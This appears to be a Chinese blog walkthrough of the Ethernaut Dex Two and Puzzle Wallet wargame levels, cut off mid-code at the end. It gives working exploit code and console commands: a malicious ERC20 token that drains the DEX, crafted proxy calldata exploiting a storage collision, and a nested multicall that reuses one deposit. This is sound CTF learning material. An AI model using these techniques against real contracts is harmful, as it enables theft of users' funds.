<p>一开始您可以得到10个token1和token2。DEX合约仍然以每个代币100个开始。</p>
<p> 可能有帮助的注意点：</p>
<ul>
<li>交换方法是如何修改的？</li>
<li>你可以在攻击中使用自定义代币合约吗？</li>
<li>获取新实例</li>
</ul>
<h5 id="合约代码-23"><a href="#合约代码-23" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-23"><a href="#合约分析-23" class="headerlink" title="合约分析"></a>合约分析</h5><p>让我们看一下有漏洞的函数 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们比较上一级别的相同函数，我们会发现这一级别缺少一行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br></pre></td></tr></table></figure>

<p>它负责验证交换是否仅发生在合约定义的两个代币地址上。由于 Dex Two 不存在这一点，因此我们可以交换任何代币。即使是我们创造的。所以我们可以通过交换自己的代币来耗尽 Dex Two。</p>
<h5 id="利用计算-1"><a href="#利用计算-1" class="headerlink" title="利用计算"></a>利用计算</h5><p>要利用 Dex Two，我们需要执行以下操作：</p>
<ul>
<li>创建我们自己的 ERC20 代币并铸造 ( <code>msg.sender</code>) 400 ZombieTokens (ZTN)（我们的恶意代币名称）。</li>
<li>发送 100 ZTN 到 Dex Two，以便交换时价格比例平衡为 1:1。</li>
<li>批准 Dex 花费我们的 300 个 ZTN。我们需要它来交换 100 个 token1 和 200 个 token2。当我们看到下面的余额表时，这一点就会更清楚。</li>
<li>完成所有这些后，余额的分配方式如下：</li>
</ul>
<table>
<thead>
<tr>
<th>Dex two</th>
<th></th>
<th></th>
<th>user</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>token1</td>
<td>token2</td>
<td>ZTN</td>
<td>token1</td>
<td>token2</td>
<td>ZTN</td>
</tr>
<tr>
<td>100</td>
<td>100</td>
<td>100</td>
<td>10</td>
<td>10</td>
<td>300</td>
</tr>
</tbody></table>
<ul>
<li>将 100 ZTN 与 token1 交换。这将从 Dex Two 中耗尽所有 token1。</li>
</ul>
<p>100*100&#x2F;100&#x3D;  100</p>
<table>
<thead>
<tr>
<th>Dex two</th>
<th></th>
<th></th>
<th>user</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>token1</td>
<td>token2</td>
<td>ZTN</td>
<td>token1</td>
<td>token2</td>
<td>ZTN</td>
</tr>
<tr>
<td>100</td>
<td>100</td>
<td>100</td>
<td>10</td>
<td>10</td>
<td>300</td>
</tr>
<tr>
<td>0</td>
<td>100</td>
<td>200</td>
<td>110</td>
<td>10</td>
<td>200</td>
</tr>
</tbody></table>
<ul>
<li>根据 中的公式<code>get_swap_amount()</code>，要从 Dex 中获取所有 token2，我们 <code>100 = (x * 100)/200</code>- <code>x = 200 ZTN</code>。因此，我们需要兑换200个ZTN才能获得100个token2。完成后，最终的余额表如下所示：</li>
</ul>
<table>
<thead>
<tr>
<th>Dex two</th>
<th></th>
<th></th>
<th>user</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>token1</td>
<td>token2</td>
<td>ZTN</td>
<td>token1</td>
<td>token2</td>
<td>ZTN</td>
</tr>
<tr>
<td>100</td>
<td>100</td>
<td>100</td>
<td>10</td>
<td>10</td>
<td>300</td>
</tr>
<tr>
<td>0</td>
<td>100</td>
<td>200</td>
<td>110</td>
<td>10</td>
<td>200</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>400</td>
<td>110</td>
<td>110</td>
<td>0</td>
</tr>
</tbody></table>
<p>现在应该清楚为什么我们选择 400 ZTN 入手了。让我们部署我们的漏洞利用代码。</p>
<h5 id="攻击流程-22"><a href="#攻击流程-22" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个实例,之后查看instance的地址<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327083840751.png" alt="image-20240327083840751"></p>
<p>首先部署代币合约代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ZombieToken is ERC20 &#123;</span><br><span class="line">    constructor(uint256 initialSupply) ERC20(&quot;ZombieToken&quot;, &quot;ZTN&quot;) public &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参数填400，即为我们要发行的代币数量</p>
<p>使用我们的用户地址调用该<code>balanceOf()</code>函数，以确保我们收到 400 ZTN</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327085057276.png" alt="image-20240327085057276"></p>
<p>现在发送 100 ZTN 到 Dex Two</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327085338793.png" alt="image-20240327085338793"></p>
<p>现在让我们批准 Dex 花费 300 个代币，以便它可以交换代币</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327085443628.png" alt="image-20240327085443628"></p>
<p>然后执行交换代币的代码，<code>0x0bf35AA7f4457f02ff8D61E3d567E2520576A3A2</code>为我们自己的代币的地址</p>
<p><code>await contract.swap(&quot;0x0bf35AA7f4457f02ff8D61E3d567E2520576A3A2&quot;,await contract.token1(),&quot;100&quot;)</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327091435390.png" alt="image-20240327091435390"></p>
<p><code>await contract.swap(&quot;0x0bf35AA7f4457f02ff8D61E3d567E2520576A3A2&quot;,await contract.token2(),&quot;200&quot;)</code></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327091417007.png" alt="image-20240327091417007"></p>
<p>最后提交示例即可</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240327092832759.png" alt="image-20240327092832759"></p>
<h3 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h3><h5 id="闯关要求-16"><a href="#闯关要求-16" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>事实上，如今，为DeFi运营付费是不可能的。</p>
<p>一群朋友发现了如何通过在一个交易中批量处理来稍微降低执行多个交易的成本，因此他们开发了一个智能合约来执行此操作。</p>
<p>他们需要这个合约是可升级的，以防代码包含错误，他们还想阻止团队外的人使用它。为此，他们投票并分配了两个在系统中具有特殊角色的人： 管理员：有权更新智能合约的逻辑； 所有者：控制允许使用合约的地址白名单。 合同已部署，该组被列入白名单。每个人都为他们对抗邪恶矿工的成就而欢呼。</p>
<p>他们几乎不知道，他们的午餐钱处于危险之中…… 你需要劫持这个钱包，去成为代理的管理员。</p>
<p> 可能有帮助的注意点:</p>
<ul>
<li>了解委托调用的工作原理以及执行调用时 msg.sender 和 msg.value 的行为方式。</li>
<li>了解代理模式及其处理存储变量的方式。</li>
</ul>
<h5 id="合约代码-24"><a href="#合约代码-24" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-24"><a href="#合约分析-24" class="headerlink" title="合约分析"></a>合约分析</h5><p>该级别由两个合约组成，一个名为 PuzzleProxy 的代理合约和一个名为 PuzzleWallet 的逻辑&#x2F;实现合约。那么什么是代理合约和实现合约？是时候了解可升级合约了。</p>
<h6 id="可升级合约"><a href="#可升级合约" class="headerlink" title="可升级合约"></a>可升级合约</h6><p>我们在以太坊上进行的每笔交易都是不可变的，无法修改或更新。这是使网络安全并帮助网络上的任何人验证和确认交易的优势。由于这一限制，开发人员在更新合约代码时面临问题，因为一旦部署到区块链上就无法对其进行修改。</p>
<p>为了克服这种情况，引入了可升级合约。此部署模式由两个合同组成 - 代理合同（存储层）和实施合同（逻辑层）。</p>
<p>在该架构中，用户通过代理合约与逻辑合约进行交互，当需要更新逻辑合约的代码时，代理合约中的逻辑合约的地址会被更新，从而允许用户与新的逻辑合约进行交互。</p>
<p>学过设计模式的同学其实都知道什么是代理模式：为其他对象提供一种代理以控制对某个对象的访问。也就是说，每次我要访问A，其实我是通过调用B的接口，而B中存有A的对象实例，并对外暴露与A相同的接口，这时候，当我们调用B时，我们仍以为自己在访问A，并对其中代理部分浑然不觉。</p>
<p>那么，代理模式的优点又在哪里呢？如果业务有更新，完全可以实现热部署，代理实例通过切换对象实例，此时使用者不会感觉到服务有中断或者发生了变化。</p>
<p>而在智能合约中，要使用代理模式，思路也是一样的，就是为了解决合约一旦上链无法更新的问题。当我们需要更新合约时，只要将代理合约中的合约实例指向新创建的合约即可。此时，对和代理合约交互的用户来说，并没有感到服务产生了变化。现在很多链游就是基于以上原理，可以不断的更新合约、更新游戏。而转发具体是怎么实现的呢？其实就是利用fallback函数，当用户访问不存在的函数时，会进入fallback，代理合约在此处即可完成转发。</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/ZshcJZhkW.png" alt="图片.png"></p>
<p>在实现可升级模式时需要注意的一点是，两个合约中的slot位排列应该相同，因为slot位是映射的。这意味着当<code>代理合约call执行合约时，代理合约的存储变量会被修改</code>，这就是我们的攻击的地方。</p>
<h5 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h5><p>我们来看看两个合约中的slot安排：</p>
<table>
<thead>
<tr>
<th>Slot #</th>
<th>PuzzleProxy</th>
<th>PuzzleWallet</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>pendingAdmin</td>
<td>owner</td>
</tr>
<tr>
<td>1</td>
<td>admin</td>
<td>maxBalance</td>
</tr>
</tbody></table>
<p>由于我们需要成为代理的管理员，因此我们需要覆盖slot 1 中的值，即 或<code>admin</code>变量<code>maxBalance</code>。</p>
<p>想要通过setMaxBalance修改<code>maxBalance</code>有一个先决条件，那就是<code>onlyWhitelisted</code>，即用户需要在白名单中。而要添加到白名单，需要调用addToWhitelist方法，这又需要require(msg.sender &#x3D;&#x3D; owner, “Not the owner”);，所以我们可以先通过修改pendingAdmin修改owner，然后在逐一完成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">  require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">  maxBalance = _maxBalance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先生成<code>selector</code>将其和<code>param</code>合并生成交易中的<code>data</code>，以此可以发起对<code>proposeNewAdmin(address)</code>方法的调用。在修改过后此时合约的<code>owner</code>已修改为<code>&#39;0x0bD590c9c9d88A64a15B4688c2B71C3ea39DBe1b&#39;</code>。</p>
<blockquote>
<p>注意：为什么这里的执行合约可以去调用代理合约的函数，我们可以通过下面的，可升级合约的关键代码去理解调用原理其实就是delegatecall调用后内置变量 msg 的值不会修改为调用者，而是caller的账户地址（这里就是代理合约的账户地址），但执行环境为调用者的运行环境（代理合约的地址）</p>
<p>所以delegatecall 实际上会在调用合约的上下文中执行代码，因此无论调用的合约是代理合约还是执行合约，都可以被调用 </p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240328093706586.png" alt="image-20240328093706586"></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">selector = web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;proposeNewAdmin(address)&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="comment">//&#x27;0xa6376746&#x27;</span></span><br><span class="line">param = <span class="string">&quot;00000000000000&quot;</span>+player.<span class="title function_">slice</span>(<span class="number">2</span>,)</span><br><span class="line"><span class="comment">//&#x27;00000000000000E92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span></span><br><span class="line">param = <span class="string">&quot;000000000000000000000000&quot;</span>+player.<span class="title function_">slice</span>(<span class="number">2</span>,)</span><br><span class="line"><span class="comment">//&#x27;000000000000000000000000E92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span></span><br><span class="line">param.<span class="property">length</span></span><br><span class="line"><span class="comment">//64</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:selector+param&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="comment">//&#x27;0xE92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240328094147207.png" alt="image-20240328094147207"></p>
<p>通过<code>await contract.addToWhitelist(player)</code>将用户添加到白名单中，此时再用<code>await contract.whitelisted(player)</code>进行检查。</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240328094341148.png" alt="image-20240328094341148"></p>
<p>然后，如果要设置<code>setMaxBalance</code>需要满足条件<code>require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</code>即合约本身余额不能为0，而我们通过<code>await getBalance(contract.address)</code>可以查询到合约还有余额<code>0.001</code>以太。我们应当办法将其移除。</p>
<p>此时我们可以查看到槽的存储情况如下，<code>slot 0</code>已变成了用户地址，而<code>slot 1</code>却是关卡合约的地址。</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240328163441208.png" alt="image-20240328163441208"></p>
<p>这是什么原因呢？这是因为，在初始化代理合约时，<code>admin</code>变量已经确定，所以当后续调用<code>init</code>时，由于存储冲突，所以<code>maxBalance</code>不为0，所以该方法其实调用就失败了，原始值也就没有更改。</p>
<p>我们想到<code>multicall</code>里面有这么一个限制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (selector == this.deposit.selector) &#123;</span><br><span class="line">    require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">    // Protect against reusing msg.value</span><br><span class="line">    depositCalled = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是什么意思呢？ 那就是<strong>只能存一次</strong>，如果在<code>multicall</code>里调用两次<code>deposite</code>函数，我们也不应当重复计算所存的数量。这里只是简单的对data的选择器作了单层校验，我们如果将其封装，似乎是可以绕过的。</p>
<p>于是我们可以构造这样一个参数，第一个为调用<code>deposite</code>函数，第二个为调用<code>multicall</code>函数，但是参数为调用<code>deposite</code>函数的data，于是就可以调用两次<code>deposite</code>函数了,但是我们只需要附带一个<code>value</code>就行。</p>
<p>执行代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="comment">//&#x27;0.001&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="property">multicall</span>.<span class="title function_">request</span>([web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;deposit()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)])</span><br><span class="line"><span class="comment">/*&#123;from: &#x27;0xE92F4FD673fCB0f578aC2dF10145396170E05aD7&#x27;, gasPrice: 13644492, gas: 2000000, to: &#x27;0xAf92FD0290d95F319ef24e4341493d3D22B86e27&#x27;, data: &#x27;0xac9650d80000000000000000000000000000000000000000…0000000000000000000000000000000000000000000000000&#x27;&#125;</span></span><br><span class="line"><span class="comment">data: &quot;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"><span class="comment">from: &quot;0xE92F4FD673fCB0f578aC2dF10145396170E05aD7&quot;</span></span><br><span class="line"><span class="comment">gas: 2000000gas</span></span><br><span class="line"><span class="comment">Price: 13644492</span></span><br><span class="line"><span class="comment">to: &quot;0xAf92FD0290d95F319ef24e4341493d3D22B86e27&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">data = <span class="string">&quot;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"></span><br><span class="line">selector = web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;deposit()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="comment">//&#x27;0xd0e30db0&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">multicall</span>([data,selector],&#123;<span class="attr">value</span>:web3.<span class="property">utils</span>.<span class="title 